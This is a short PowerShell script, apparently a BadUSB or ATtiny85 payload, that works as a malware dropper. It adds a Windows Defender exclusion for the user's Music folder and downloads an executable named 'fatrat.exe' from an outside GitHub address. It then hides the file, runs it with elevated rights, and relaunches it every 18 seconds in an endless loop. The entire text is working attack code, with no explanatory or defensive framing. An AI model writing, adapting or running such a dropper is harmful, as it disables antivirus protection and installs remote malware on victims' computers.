

$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"

if (Test-Path $path) {
    Remove-Item $path -Force
} 


Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   



while ($true) {
    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
    Start-Sleep -Seconds 18
}




